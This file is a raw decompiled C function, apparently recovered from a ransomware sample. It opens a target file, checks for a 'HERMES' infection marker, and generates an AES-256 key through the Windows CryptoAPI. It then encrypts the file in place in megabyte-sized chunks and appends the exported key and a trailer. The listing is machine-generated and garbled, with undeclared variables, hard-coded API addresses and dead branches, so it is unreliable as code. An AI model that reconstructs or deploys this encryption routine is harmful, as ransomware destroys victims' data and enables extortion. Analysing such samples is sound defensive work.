#include <iostream>
#include <vector>
#include <algorithm>
#include <cmath>
#include <ctime>
#include <fstream>
#include <cstdlib>
#include <cstdint>
#include <cassert>
#include <Windows.h>

int64_t SetFileAttributesW = 0x7ffe5bff4f50;

int64_t CreateFileW = 0x7ffe5bff4b60;

int64_t GetFileSizeEx = 0x7ffe5bff4d90;

int64_t CloseHandle = 0x7ffe5bff48e0;

int64_t SetFilePointerEx = 0x7ffe5bff4f80;

void fun_140007410();

int64_t ReadFile = 0x7ffe5bff4ee0;

int64_t SetFilePointer = 0x7ffe5bff4f70;

int64_t CryptGenKey = 0x7ffe5c7cf530;

int64_t CryptDestroyKey = 0x7ffe5c7b7010;

int64_t VirtualAlloc = 0x7ffe5bfe8500;

int64_t CryptEncrypt = 0x7ffe5c7cf490;

int64_t WriteFile = 0x7ffe5bff4fd0;

void fun_1400017f0(int64_t rcx, void* rdx);

int64_t CryptExportKey = 0x7ffe5c7b6a60;

int64_t VirtualFree = 0x7ffe5bfea130;

void fun_140015c40(void* rcx, void* rdx, int64_t r8, void* r9);

void fun_140003a30(int64_t rcx, int64_t rdx, int64_t r8, int32_t r9d) {
    rsp5 = (void*)((int64_t)__zero_stack_offset() - 8 - 8 - 8 - 8 - 8);
    rbp6 = (void*)((int64_t)rsp5 - 0x130);
    v7 = r8;
    r14_8 = rdx;
    SetFileAttributesW();
    *(uint32_t*)&rdx9 = 0xc0000000;
    *(int32_t*)((int64_t)&rdx9 + 4) = 0;
    rax10 = (int64_t)CreateFileW(rcx, 0xc0000000);
    rsp11 = (void*)((int64_t)rsp5 - 0x230 - 8 + 8 - 8 + 8);
    rbx12 = rax10;
    if (rax10) {
        if (rax10 != -1) {
            GetFileSizeEx(rax10, (int64_t)rsp11 + 88);
            rsp13 = (void*)((int64_t)rsp11 - 8 + 8);
            rdx9 = (void*)((int64_t)rsp13 + 0x70);
            GetFileSizeEx(rbx12, rdx9);
            rsp11 = (void*)((int64_t)rsp13 - 8 + 8);
        }
        if (!1) 
            goto addr_140003b10_5;
    } else {
        CloseHandle();
        goto addr_140004432_7;
    }
    *(uint32_t*)&r15_14 = 0;
    v15 = 0;
    if (!1) {
        rdx9 = (void*)(__intrinsic() >> 18);
        if (1) {
            if (1) {
                if (1) {
                    *(uint32_t*)&rdx9 = *reinterpret_cast<uint32_t*>(&rdx9);
                    *(int32_t*)((int64_t)&rdx9 + 4) = 0;
                }
            } else {
                rdx9 = (void*)(__intrinsic() >> 18);
            }
            *(uint32_t*)&r15_14 = *reinterpret_cast<uint32_t*>(&rdx9);
            *(int32_t*)((int64_t)&r15_14 + 4) = 0;
            v15 = r15_14;
            if (*reinterpret_cast<uint32_t*>(&rdx9) > 0xfa0) 
                goto addr_140003c34_15; else 
                goto addr_140003c29_16;
        } else {
            rdx9 = __intrinsic();
            r15_14 = (uint64_t)rdx9 >> 18;
            v15 = r15_14;
            if (*reinterpret_cast<uint32_t*>(&r15_14) <= 0xfa0) {
                addr_140003c29_16:
                if (!*(uint32_t*)&r15_14) 
                    goto addr_140003c34_15;
            } else {
                *(uint32_t*)&r15_14 = 0xf9f;
                v15 = 0xf9f;
            }
        }
    }
    if (0) {
        if (!r9d) {
            addr_140004415_21:
        } else {
            if (1) 
                goto addr_140003d26_23;
            eax16 = (int32_t)SetFilePointerEx(rbx12, 0xfffffede);
            rsp11 = (void*)((int64_t)rsp11 - 8 + 8);
            if (eax16 != -1) 
                goto addr_140003c8b_25; else 
                goto addr_140003c81_26;
        }
    } else {
        addr_140003c34_15:
        CloseHandle(rbx12, rdx9);
    }
    addr_14000441a_27:
    addr_14000442a_28:
    addr_140004432_7:
    fun_140007410();
    return;
    addr_140003c8b_25:
    eax17 = (int32_t)ReadFile(rbx12, (int64_t)rbp6 - 64, 25, (int64_t)rbp6 - 0x80);
    rsp11 = (void*)((int64_t)rsp11 - 8 + 8);
    if (eax17) {
        rdx18 = eax17;
        ecx19 = 0;
        do {
            if (!rdx18) 
                continue;
            if (v20 != 72) 
                continue;
            if (v21 != 69) 
                continue;
            if (v22 != 82) 
                continue;
            if (v23 != 77) 
                continue;
            if (v24 != 69) 
                continue;
            if (v25 == 83) 
                break;
            ++ecx19;
        } while (ecx19 < 20);
        goto addr_140003cf3_38;
    } else {
        goto addr_14000441a_27;
    }
    CloseHandle(rbx12);
    goto addr_14000441a_27;
    addr_140003cf3_38:
    eax26 = (int32_t)SetFilePointer(rbx12);
    rsp11 = (void*)((int64_t)rsp11 - 8 + 8);
    if (eax26 != -1) {
        addr_140003d26_23:
        r9_27 = (void*)((int64_t)rsp11 + 64);
        eax28 = (int32_t)CryptGenKey(r14_8, 0x6610, 1, r9_27);
        rsp29 = (void*)((int64_t)rsp11 - 8 + 8);
        if (eax28) {
            if (1) {
                r13_30 = __intrinsic() >> 18;
                *(uint32_t*)&r14_31 = -(*reinterpret_cast<uint32_t*>(&r13_30) * 0xf4240);
                *(int32_t*)((int64_t)&r14_31 + 4) = 0;
                v32 = r14_31;
            } else {
                *(uint32_t*)&rdx33 = *reinterpret_cast<uint32_t*>(&r15_14) * 0xf4240;
                *(int32_t*)((int64_t)&rdx33 + 4) = 0;
                *(uint32_t*)&r13_30 = *reinterpret_cast<uint32_t*>(&r15_14);
                eax34 = (int32_t)SetFilePointer(rbx12, rdx33);
                if (eax34 != -1) {
                    r9_35 = (void*)((int64_t)rbp6 - 0x80);
                    rdx36 = (void*)((int64_t)rbp6 - 80);
                    eax37 = (int32_t)ReadFile(rbx12, rdx36, 16, r9_35);
                    if (eax37) {
                        eax38 = (int32_t)SetFilePointer(rbx12);
                        rsp29 = (void*)((int64_t)rsp29 - 8 + 8 - 8 + 8 - 8 + 8);
                        if (eax38 != -1) {
                            *(uint32_t*)&v32 = 0;
                        } else {
                            CloseHandle(rbx12);
                            CryptDestroyKey(0);
                            goto addr_14000441a_27;
                        }
                    } else {
                        CloseHandle(rbx12, rdx36, 16, r9_35);
                        CryptDestroyKey(0, rdx36, 16, r9_35);
                        goto addr_14000441a_27;
                    }
                } else {
                    CloseHandle(rbx12, rdx33);
                    CryptDestroyKey(0, rdx33);
                    goto addr_14000441a_27;
                }
            }
        } else {
            CloseHandle(rbx12, 0x6610, 1, r9_27);
            CryptDestroyKey(0, 0x6610, 1, r9_27);
            goto addr_14000441a_27;
        }
    } else {
        goto addr_14000441a_27;
    }
    rax39 = (int8_t*)VirtualAlloc();
    rsp40 = (void*)((int64_t)rsp29 - 8 + 8);
    rsi41 = rax39;
    if (rax39) {
        r14d42 = 0;
        r12d43 = 0;
        do {
            v44 = 0xf4240;
            if (r14d42 == *(uint32_t*)&r13_30) {
                rax45 = v32;
                v44 = *reinterpret_cast<int32_t*>(&rax45);
            }
            *(uint32_t*)&rdx46 = r12d43;
            *(int32_t*)((int64_t)&rdx46 + 4) = 0;
            eax47 = (int32_t)SetFilePointer(rbx12, rdx46);
            rsp48 = (void*)((int64_t)rsp40 - 8 + 8);
            if (eax47 == -1) 
                break;
            *(int32_t*)&r8_49 = v44;
            *(int32_t*)((int64_t)&r8_49 + 4) = 0;
            eax50 = (int32_t)ReadFile(rbx12, rsi41, r8_49, (int64_t)rsp48 + 80);
            if (!eax50) 
                goto addr_140004500_58;
            eax51 = (int32_t)CryptEncrypt(0);
            if (!eax51) 
                goto addr_1400044d6_60;
            eax52 = (int32_t)CryptEncrypt(0);
            if (!eax52) 
                goto addr_1400044a7_62;
            *(uint32_t*)&rdx53 = r12d43;
            *(int32_t*)((int64_t)&rdx53 + 4) = 0;
            eax54 = (int32_t)SetFilePointer(rbx12, rdx53);
            rsp55 = (void*)((int64_t)rsp48 - 8 + 8 - 8 + 8 - 8 + 8 - 8 + 8);
            if (eax54 == -1) 
                goto addr_14000447b_64;
            *(int32_t*)&r8_56 = v44;
            *(int32_t*)((int64_t)&r8_56 + 4) = 0;
            r9_57 = (void*)((int64_t)rsp55 + 80);
            eax58 = (int32_t)WriteFile(rbx12, rsi41, r8_56, r9_57);
            rsp40 = (void*)((int64_t)rsp55 - 8 + 8);
            if (!eax58) 
                goto addr_14000444f_66;
            ++r14d42;
            r12d43 = r12d43 + 0xf4240;
        } while (r14d42 <= *reinterpret_cast<uint32_t*>(&r13_30));
        goto addr_140003fb7_68;
    } else {
        CloseHandle(rbx12, 0xf429a, 0x1000, 4);
        CryptDestroyKey(0, 0xf429a, 0x1000, 4);
        goto addr_14000441a_27;
    }
    addr_140004500_58:
    addr_1400044d6_60:
    addr_1400044a7_62:
    addr_14000447b_64:
    addr_14000444f_66:
    addr_140003fb7_68:
    if (1) {
        ecx59 = 1;
        do {
            ++ecx59;
        } while (v60);
        if (ecx59) 
            goto addr_14000416f_74;
    } else {
        SetFilePointerEx(rbx12, 0);
        *(int32_t*)&rcx61 = *reinterpret_cast<int32_t*>(&v15);
        *(int32_t*)((int64_t)&rcx61 + 4) = 0;
        v32 = 0;
        fun_1400017f0(rcx61, (int64_t)rbp6 - 96);
        rsp40 = (void*)((int64_t)rsp40 - 8 + 8 - 8 + 8);
        *(int32_t*)&rcx62 = 1;
        *(int32_t*)((int64_t)&rcx62 + 4) = 0;
        if (!1) {
            do {
                *(int32_t*)&rcx62 = *reinterpret_cast<int32_t*>(&rcx62) + 1;
                *(int32_t*)((int64_t)&rcx62 + 4) = 0;
            } while (0);
        }
        *(int32_t*)&rax63 = *reinterpret_cast<int32_t*>(&rcx62);
        *(int32_t*)((int64_t)&rax63 + 4) = 0;
        *(int32_t*)&r9_64 = 1;
        *(int32_t*)((int64_t)&r9_64 + 4) = 0;
        *(int8_t*)((int64_t)rbp6 + (int64_t)rax63 - 0x78) = 0x7c;
        *(int32_t*)&rax65 = static_cast<int32_t>(rcx62 + 1);
        *(int32_t*)((int64_t)&rax65 + 4) = 0;
        *(int8_t*)((int64_t)rbp6 + (int64_t)rax65 - 0x78) = 0;
        if (!1) {
            do {
                *(int32_t*)&r9_64 = *reinterpret_cast<int32_t*>(&r9_64) + 1;
                *(int32_t*)((int64_t)&r9_64 + 4) = 0;
            } while (0);
        }
        r8d66 = 1;
        if (!1) {
            do {
                ++r8d66;
            } while (0);
        }
        *(uint32_t*)&rdx67 = 0;
        *(int32_t*)((int64_t)&rdx67 + 4) = 0;
        if (r8d66) {
            do {
                *(int32_t*)&rcx68 = static_cast<int32_t>(r9_64 + rdx67);
                *(int32_t*)((int64_t)&rcx68 + 4) = 0;
                *(uint32_t*)&rdx67 = *reinterpret_cast<uint32_t*>(&rdx67) + 1;
                *(int32_t*)((int64_t)&rdx67 + 4) = 0;
                *(int8_t*)((int64_t)rbp6 + (int64_t)rcx68 - 0x78) = 0;
            } while (*reinterpret_cast<uint32_t*>(&rdx67) < r8d66);
        }
        *(int32_t*)&rax69 = static_cast<int32_t>(r9_64 + rdx67);
        *(int32_t*)((int64_t)&rax69 + 4) = 0;
        *(int32_t*)&rcx70 = 1;
        *(int32_t*)((int64_t)&rcx70 + 4) = 0;
        *(int8_t*)((int64_t)rbp6 + (int64_t)rax69 - 0x78) = 0;
        if (!1) {
            do {
                *(int32_t*)&rcx70 = *reinterpret_cast<int32_t*>(&rcx70) + 1;
                *(int32_t*)((int64_t)&rcx70 + 4) = 0;
            } while (0);
        }
        *(int32_t*)&rax71 = *reinterpret_cast<int32_t*>(&rcx70);
        *(int32_t*)((int64_t)&rax71 + 4) = 0;
        *(int32_t*)&r9_72 = 1;
        *(int32_t*)((int64_t)&r9_72 + 4) = 0;
        *(int8_t*)((int64_t)rbp6 + (int64_t)rax71 - 0x78) = 0x7c;
        *(int32_t*)&rax73 = static_cast<int32_t>(rcx70 + 1);
        *(int32_t*)((int64_t)&rax73 + 4) = 0;
        *(int8_t*)((int64_t)rbp6 + (int64_t)rax73 - 0x78) = 0;
        if (!1) {
            do {
                *(int32_t*)&r9_72 = *reinterpret_cast<int32_t*>(&r9_72) + 1;
                *(int32_t*)((int64_t)&r9_72 + 4) = 0;
            } while (0);
        }
        r8d74 = 1;
        do {
            ++r8d74;
        } while (v75);
        *(uint32_t*)&rdx76 = 0;
        *(int32_t*)((int64_t)&rdx76 + 4) = 0;
        if (r8d74) {
            do {
                eax77 = v78;
                *(int32_t*)&rcx79 = static_cast<int32_t>(r9_72 + rdx76);
                *(int32_t*)((int64_t)&rcx79 + 4) = 0;
                *(uint32_t*)&rdx76 = *reinterpret_cast<uint32_t*>(&rdx76) + 1;
                *(int32_t*)((int64_t)&rdx76 + 4) = 0;
                *(int8_t*)((int64_t)rbp6 + (int64_t)rcx79 - 0x78) = *reinterpret_cast<int8_t*>(&eax77);
            } while (*reinterpret_cast<uint32_t*>(&rdx76) < r8d74);
        }
        *(int32_t*)&rax80 = static_cast<int32_t>(r9_72 + rdx76);
        *(int32_t*)((int64_t)&rax80 + 4) = 0;
        *(int8_t*)((int64_t)rbp6 + (int64_t)rax80 - 0x78) = 0;
    }
    addr_14000417f_101:
    if (!1) {
        do {
        } while (*(int8_t*)((int64_t)&v32 + 7));
    }
    eax81 = (int32_t)WriteFile(rbx12, (int64_t)rbp6 - 0x78);
    if (eax81) {
        r14_82 = v7;
        eax83 = (int32_t)CryptExportKey(0, r14_82, 1);
        rsp84 = (void*)((int64_t)rsp40 - 8 + 8 - 8 + 8);
        if (eax83) {
            *(int32_t*)&rcx85 = 4;
            *(int32_t*)((int64_t)&rcx85 + 4) = 0;
            do {
                --rcx85;
            } while (rcx85);
            *(int32_t*)&r8_86 = static_cast<int32_t>(rcx85 + 1);
            *(int32_t*)((int64_t)&r8_86 + 4) = 0;
            eax87 = (int32_t)CryptExportKey(0, r14_82, r8_86);
            if (!eax87) 
                goto addr_1400042bb_109;
        } else {
            VirtualFree(rsi41);
            CloseHandle(rbx12);
            CryptDestroyKey(0);
            goto addr_14000441a_27;
        }
    } else {
        VirtualFree(rsi41);
        CloseHandle(rbx12);
        CryptDestroyKey(0);
        goto addr_14000441a_27;
    }
    *(int32_t*)&r8_88 = v89;
    *(int32_t*)((int64_t)&r8_88 + 4) = 0;
    r9_90 = (void*)((int64_t)rsp84 - 8 + 8 + 84);
    rdx91 = (void*)((int64_t)rbp6 - 32);
    eax92 = (int32_t)WriteFile(rbx12, rdx91, r8_88, r9_90);
    if (eax92) {
        if (1) 
            goto addr_1400043e4_114;
        eax93 = (int32_t)SetFilePointerEx(rbx12, 0);
        if (eax93 == -1) 
            goto addr_140004366_116;
    } else {
        VirtualFree(rsi41);
        CloseHandle(rbx12);
        CryptDestroyKey(0);
        goto addr_14000441a_27;
    }
    r9_90 = (void*)((int64_t)rbp6 - 0x80);
    *(int32_t*)&r8_88 = 16;
    *(int32_t*)((int64_t)&r8_88 + 4) = 0;
    rdx91 = (void*)((int64_t)rbp6 - 80);
    eax94 = (int32_t)WriteFile(rbx12, rdx91, 16, r9_90);
    if (eax94) {
        addr_1400043e4_114:
        CloseHandle(rbx12, rdx91, r8_88, r9_90);
        ecx95 = 0xf429a;
        rdi96 = rsi41;
    } else {
        VirtualFree(rsi41);
        CloseHandle(rbx12);
        CryptDestroyKey(0);
        goto addr_14000441a_27;
    }
    while (ecx95) {
        --ecx95;
        *rdi96 = 0;
        ++rdi96;
        ++rsi41;
    }
    VirtualFree(rsi41);
    CryptDestroyKey(0);
    goto addr_140004415_21;
    addr_140004366_116:
    VirtualFree(rsi41);
    CloseHandle(rbx12);
    CryptDestroyKey(0);
    goto addr_14000441a_27;
    addr_1400042bb_109:
    VirtualFree(rsi41);
    CloseHandle(rbx12);
    CryptDestroyKey(0);
    goto addr_14000441a_27;
    addr_14000416f_74:
    *(int32_t*)&r8_97 = ecx59;
    *(int32_t*)((int64_t)&r8_97 + 4) = 0;
    fun_140015c40((int64_t)rbp6 - 0x78, (int64_t)rbp6 - 0x80, r8_97, r9_57);
    rsp40 = (void*)((int64_t)rsp40 - 8 + 8);
    goto addr_14000417f_101;
    addr_140003c81_26:
    goto addr_14000441a_27;
    addr_140003b10_5:
    CloseHandle(rbx12, rdx9);
    goto addr_14000442a_28;
}
